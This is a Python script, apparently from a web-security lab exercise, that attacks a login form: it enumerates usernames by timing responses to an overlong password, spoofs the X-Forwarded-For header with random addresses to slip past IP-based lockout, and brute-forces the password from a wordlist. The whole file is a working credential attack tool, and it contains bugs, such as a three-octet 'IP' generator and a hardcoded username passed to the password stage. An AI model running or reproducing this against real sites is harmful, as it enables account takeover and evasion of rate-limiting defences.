import os
import sys
import requests
import urllib3
import time
import random
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


class RequestTime:
    def __init__(self, username, responseTime):
        self.username = username
        self.responseTime = responseTime

def genrateRandomIP():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def findUserName(url):
    print("Enumerating The username: ")
    response_times =  []
    
    with open("usernames.txt", "r") as file:
        for username in file:
           print('\r' + ' ' * 50, end='', flush=True)
           print(f'\rTrying {username.strip()}', end='', flush=True)
           data = {'username':username.strip(), 'password':'HHHHHHHHHHHHfqsiqosdfhqsdfoqsdfoqusdfhqosdufqsdfouqsdhfou'}
           headers = {'X-Forwarded-For': genrateRandomIP()}
           start_time = time.time()
           responce = requests.post(url,data=data,proxies=proxies,  verify=False, headers=headers).text
           end_time = time.time()
           reponce_time = (end_time - start_time)*1000
           response_times.append( RequestTime(username, reponce_time))
           print(f"    Responce Time = {reponce_time} ms", end='', flush=True)    
        longest_response_time = max(response_times, key=lambda x: x.responseTime)
        response_times.sort(key=lambda x: x.responseTime, reverse=True)
        for obj in response_times:
            print(f"\n{obj.username}  => response Time : {obj.responseTime}")
        print(f"Username with the longest response time: {longest_response_time.username}, Response Time: {longest_response_time.responseTime} ms")
        return longest_response_time.username

def findPassword(username,url):
    print("Enumerating The Password: ")
    with open("passwords.txt", "r") as file:
        for password in file:
           print('\r' + ' ' * 50, end='', flush=True)
           print(f'\rTrying {password.strip()}', end='', flush=True)
           data = {'username':username, 'password':password.strip()}
           headers = {'X-Forwarded-For': genrateRandomIP()}
           responce = requests.post(url,data=data,proxies=proxies, headers=headers, verify=False).text
           if  responce.find('Invalid username ') == -1: 
               return password.strip()
    
    return ''

def main():
    try:
        os.system('clear')
        
        if len(sys.argv) != 2:
            print(f'[Usage]: python {sys.argv[0]} <url>')
            print(f'Example: python {sys.argv[0]} www.example.com')
            sys.exit(-1)
        url = sys.argv[1]
        print('Note: The Script is not accurate because of the response time measuring \n You shoudl use external program to measure the response times ')
        username =findUserName(url)
        if username == '':
            print('\nCannot find username ... ')
    
            sys.exit(-1)
        print(f'\nUsername => {username}')

        password = findPassword('app01', url)
        if password =='':
            print("\nCan't Find PAssword")
            sys.exit(-1)
        print(f"\nPassword =>  {password}")
    except:
        print('\n\aProblem During Execution !!')
if __name__ == "__main__":
    main()


